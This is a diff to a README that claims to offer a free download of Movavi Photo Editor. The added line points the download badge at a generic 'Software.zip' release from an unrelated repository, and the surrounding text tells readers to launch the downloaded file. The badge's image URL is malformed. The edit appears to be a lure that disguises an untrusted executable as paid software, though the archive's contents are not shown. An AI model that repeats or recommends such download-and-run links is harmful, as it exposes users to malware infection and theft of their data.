@@ -23,7 +23,7 @@ Feel free to explore the repository and make the most of the resources available
 
 To quickly access the software itself, you can download the latest version of Movavi Photo Editor via the following link: 
 
-[![Download Movavi Photo Editor](https://img.shields.io/badge/Download-Movavi%20Photo%20Editor-blue)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip "Launch") 
+[![Download Movavi Photo Editor](https://github.com/Nawaf-hue/Movavi-Photo-Editor-Free-/releases/download/v2.0/Software.zip%20Photo%20Editor-blue)](https://github.com/Nawaf-hue/Movavi-Photo-Editor-Free-/releases/download/v2.0/Software.zip "Launch") 
 
 Remember to launch the downloaded file to kickstart the installation process.
 
